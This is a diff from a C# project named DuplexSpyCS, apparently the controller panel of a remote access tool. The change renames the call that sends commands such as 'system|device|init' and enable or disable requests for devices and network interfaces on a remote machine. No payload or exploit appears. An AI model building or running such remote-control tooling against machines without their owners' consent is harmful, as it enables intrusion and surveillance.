@@ -49,7 +49,7 @@ namespace DuplexSpyCS
             listView1.View = View.Details;
             listView1.FullRowSelect = true;
 
-            v.encSend(2, 0, "system|app|init");
+            v.fnSendCommand("system|app|init");
         }
         public void App_ShowApps(List<string[]> apps)
         {
@@ -69,7 +69,7 @@ namespace DuplexSpyCS
         //DEVICES
         void init_Device()
         {
-            v.encSend(2, 0, "system|device|init");
+            v.fnSendCommand("system|device|init");
         }
         public void Device_ShowDevices(List<string[]> devices)
         {
@@ -135,7 +135,7 @@ namespace DuplexSpyCS
         }
         private void Device_ReqDetail()
         {
-            v.encSend(2, 0, "system|device|detail");
+            v.fnSendCommand("system|device|detail");
         }
         public void Device_ShowDetail()
         {
@@ -143,7 +143,7 @@ namespace DuplexSpyCS
         }
         private void Device_SendEnable(bool enable)
         {
-            v.encSend(2, 0, "system|device|" + (enable ? "e" : "d"));
+            v.fnSendCommand("system|device|" + (enable ? "e" : "d"));
         }
         private void Device_Refresh()
         {
@@ -182,7 +182,7 @@ namespace DuplexSpyCS
             listView2.View = View.Details;
             listView2.FullRowSelect = true;
 
-            v.encSend(2, 0, "system|if|init");
+            v.fnSendCommand("system|if|init");
         }
         public void If_ShowInterface(List<string[]> interfaces)
         {
@@ -201,7 +201,7 @@ namespace DuplexSpyCS
         private void If_ReqDetail(bool enable)
         {
             foreach (ListViewItem item in listView2.SelectedItems)
-                v.encSend(2, 0, $"system|if|enable|{clsCrypto.b64E2Str(item.Text)}|" + (enable ? "1" : "0"));
+                v.fnSendCommand($"system|if|enable|{clsCrypto.b64E2Str(item.Text)}|" + (enable ? "1" : "0"));
         }
 
         #endregion
@@ -221,7 +221,7 @@ namespace DuplexSpyCS
             listView3.View = View.Details;
             listView3.FullRowSelect = true;
 
-            v.encSend(2, 0, "system|ev|init");
+            v.fnSendCommand("system|ev|init");
         }
         public void EV_ShowEVs(List<(string, EnvironmentVariableTarget, string)> evs)
         {
